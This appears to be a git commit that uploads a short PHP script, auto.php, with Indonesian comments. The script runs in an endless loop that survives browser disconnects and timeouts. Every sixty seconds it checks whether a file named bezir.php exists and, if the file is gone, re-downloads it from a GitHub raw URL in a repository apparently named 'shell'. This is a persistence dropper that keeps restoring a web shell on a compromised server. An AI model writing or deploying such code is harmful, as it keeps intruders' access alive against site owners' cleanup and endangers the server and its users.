9edd7422c4e67547f510fa07ff74097ab0c3b307
Insomnia <lsla123.home@gmail.com>
2026-02-06 07:24:37 -0800

    Add files via upload

---
+++ auto.php
@@ -0,0 +1,15 @@
+<?php
+ignore_user_abort(true); // Biar tetep jalan meski browser ditutup
+set_time_limit(0); // Biar nggak timeout
+
+$file = 'bezir.php';
+$shell_url = 'https://raw.githubusercontent.com/1nsomn14/shell/refs/heads/main/pjp.php';
+
+while(true) {
+    if(!file_exists($file)) {
+        $content = file_get_contents($shell_url);
+        file_put_contents($file, $content);
+    }
+    sleep(60); // Cek tiap 60 detik
+}
+?>
